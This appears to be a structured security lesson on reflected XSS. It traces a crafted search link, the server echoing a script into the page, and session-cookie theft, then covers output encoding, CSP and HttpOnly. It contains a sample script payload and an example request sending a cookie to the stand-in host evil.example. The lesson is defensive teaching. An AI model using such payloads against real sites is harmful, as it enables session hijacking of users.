# Reflected XSS

`lesson` C1 · `section` C · `wave` 1 · `format` 1

## Passport

- `cwe` 79
- `owasp` A03:2021
- `severity` medium
- `impact` Someone else's script inside the site's page: actions in the victim's name, theft of the session cookie
- `defence` Output encoding
- `class` Injection into a web page

## Sources

- [OWASP: Cross Site Scripting Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP Top 10:2021, A03 Injection](https://owasp.org/Top10/2021/A03_2021-Injection/)
- [MITRE CWE-79: Improper Neutralization of Input During Web Page Generation](https://cwe.mitre.org/data/definitions/79.html)
- [MDN: Content-Security-Policy, script-src](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/script-src)
- [W3C: Content Security Policy Level 3](https://www.w3.org/TR/CSP3/)
- [MDN: Set-Cookie, the HttpOnly attribute](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Set-Cookie)
- [RFC 6265: HTTP State Management Mechanism](https://www.rfc-editor.org/rfc/rfc6265.html)

## Participants

- `attacker` **Attacker** — 203.0.113.66 · `term:attacker`
- `browser` **Victim's browser** — 192.0.2.24 · `term:victim`
- `server` **Shop server** — shop.example · `icon:server` · `term:web-server`

## Zones

- `internet` Internet: `attacker`
- `home` Home: `browser`
- `site` Site shop.example: `server` · `term:trust-boundary`

## Steps

### `link` A link with a catch

`attacker → browser` · `attack` · `icon:mail`
Message: link to search · Result: delivered

```text
https://shop.example/search?q=⟦<script>steal()</script>⟧
```

#### Simple

The victim gets a message: “Look at this discount!” and a link. The link leads to the **real**
shop shop.example, to its search page. But a piece of a program is hidden in the search word.

#### Step by step

The attacker builds a link to the shop's search page. In the `q` parameter, where a word like
“sneakers” usually goes, he puts a `<script>` tag that calls his own function.

#### Deeper

Here `steal()` is a made-up name: in real life this spot would hold code that does something in
the victim's browser. In a real link the special characters are encoded (`<` becomes `%3C`), and
the link itself is often hidden behind a URL shortener, so the catch is not visible at a glance.
The site address is real, and that is what sets XSS apart from phishing: there is no fake page.

### `click` Following the link

`browser → server` · `attack`
Message: GET /search?q=... · Result: request accepted

```http
GET /search?q=⟦%3Cscript%3Esteal()%3C%2Fscript%3E⟧
Host: shop.example
```

#### Simple

The victim clicks the link. The browser opens the shop's search and passes it the “search word”
with the script hidden inside.

#### Step by step

The browser sends the shop's server an ordinary request for the search page. The server decodes
the parameter and gets a string with a `<script>` tag.

#### Deeper

The request goes out in the victim's name: if she is logged in to the shop, the browser attaches
the session cookie by itself. For the server this is an ordinary search, and nothing bad has
happened yet. The danger is in what the server does with the string next.

### `reflect` The server pastes the input into the page

`server → browser` · `attack` · `without-defence`
Message: search page · Result: the script became part of the page

```html
<p>You searched for: ⟦<script>steal()</script>⟧</p>
```

#### Simple

The server writes “You searched for:” on the page and **puts the input there as is**. The input
was code, and in the page it stays code.

#### Step by step

The server builds the page by gluing strings: a piece of markup, the `q` parameter, another piece
of markup. The finished page goes to the victim's browser. The input “bounced” off the server and
came back, hence the name.

#### Deeper

The input became part of the page markup: that is the weakness CWE-79. MITRE calls this kind
reflected (type 1): the server takes data straight from the request and returns it in the
response. If the server first saved the input in a database and showed it to everyone, it would
be stored XSS. In the OWASP Top 10:2021, XSS is part of A03 Injection.

### `run` The browser runs the script

`browser → browser` · `attack` · `without-defence`
Message: script ran · Result: as shop.example

#### Simple

The browser does not know who wrote this script. It came with the shop's page, so for the browser
it is **the shop's script**. And it gets all the shop's rights in this tab.

#### Step by step

The browser parses the page, meets the `<script>` tag and runs it. The script sees the page, can
read the site's cookies and send requests in the victim's name.

#### Deeper

The browser separates sites by origin (scheme, host name and port) and does not let a script from
one site read another site's data. XSS gets around this separation: foreign code runs inside the
origin of shop.example. So the script can do whatever the shop itself can do in this tab: change
the page, show a fake login form, place an order.

### `steal` The cookie goes to the attacker

`browser → attacker` · `attack` · `without-defence`
Message: session cookie · Result: stolen

```http
GET /c?d=⟦session=7f3a9c⟧
Host: evil.example
```

#### Simple

The script reads the **session cookie**, the pass by which the shop recognizes the victim, and
sends it to the attacker. With this pass the attacker can enter the shop as the victim, without a
password.

#### Step by step

The script takes the value of `document.cookie` and makes a request to the attacker's server
with the cookie written into the address. The attacker's server records it.

#### Deeper

Session theft is the best-known outcome, but not the only one. If the cookie is marked
`HttpOnly`, the script cannot read it, but it can still send requests in the victim's name: the
browser attaches the cookie to them by itself. So `HttpOnly` reduces the damage but does not fix
XSS.

### `encode` The server encodes the input

`server → server` · `attack` · `with-defence` · `stopped`
Message: input encoded · Result: code became text, the attack failed

```text
⟦<⟧  →  &lt;      ⟦>⟧  →  &gt;      ⟦&⟧  →  &amp;
⟦"⟧  →  &quot;    ⟦'⟧  →  &#x27;
```

#### Simple

Now, before putting the input into the page, the server **replaces dangerous characters** with
their safe forms. The angle bracket `<` becomes `&lt;`: the browser will show it as a bracket, but
it can no longer start a tag. This is where the attack stops.

#### Step by step

The server runs the `q` parameter through an encoding function for HTML text. Five characters
that could open a tag or an attribute are replaced with character references.

#### Deeper

This is output encoding, the primary defence according to OWASP. The rule depends on where the
input lands: page text, an attribute value, JavaScript, CSS or a URL each need different handling.
Modern template engines encode by default; the danger is in escape hatches like “insert as HTML”
that turn this protection off.

### `page` A page with safe text

`server → browser` · `safe` · `with-defence`
Message: search page · Result: the script shown as text

```html
<p>You searched for: ⟦&lt;script&gt;steal()&lt;/script&gt;⟧</p>
```

#### Simple

The victim sees an odd search string with brackets on the page. But it is **just text**: nothing
runs, the cookies stay where they are.

#### Step by step

The browser parses the page and turns `&lt;` back into the `<` character, but as a letter of
text, not as the start of a tag. The script does not start.

#### Deeper

Encoding is done at the moment of output and for the exact place in the page. Cleaning input “on
the way in” is unreliable: the same string is safe in page text and dangerous inside an attribute
or a script.

### `csp` A policy forbids the foreign script

`server → browser` · `attack` · `with-defence` · `stopped`
Message: page with CSP · Result: inline script not run

```http
Content-Security-Policy: ⟦script-src 'self'⟧
```

#### Simple

Suppose some corner of the site still forgot to encode. The second layer of defence is a
**security policy**: the site tells the browser in advance where scripts may come from. A script
written right into the page is not on that list, and the browser does not run it.

#### Step by step

The server sends the `Content-Security-Policy` header with the page. The browser sees an inline
`<script>` in the markup, checks it against the policy and blocks it.

#### Deeper

The rule `script-src 'self'` allows only scripts from files of the same origin. Inline code runs
only if the policy allows it explicitly: with `'unsafe-inline'`, a one-time nonce or a hash. The
policy is defined by the W3C Content Security Policy Level 3 specification. OWASP treats it as an
extra layer, not a replacement for encoding.

## How to defend

- **Output encoding.** Anything that came from a user goes into the page only after encoding for
  its place: text, attribute, JavaScript, CSS, URL. This is the primary defence.
- **A template engine that encodes by itself.** Use it and do not bypass it: inserting “as HTML”
  turns the protection off.
- **If you need HTML from users** (for example, a formatted comment), pass it through a proven
  sanitizer, not a home-made filter.
- **Content Security Policy.** A `Content-Security-Policy` header without `'unsafe-inline'`
  forbids inline scripts: if encoding was forgotten somewhere, the browser still will not run the
  foreign code.
- **HttpOnly for the session cookie.** A script cannot read the cookie and send it to the
  attacker. This reduces the damage but does not stop XSS.
- **For users:** a link to a real site can be dangerous too. If an unexpected link has a long,
  strange address, open the site yourself, from a bookmark.
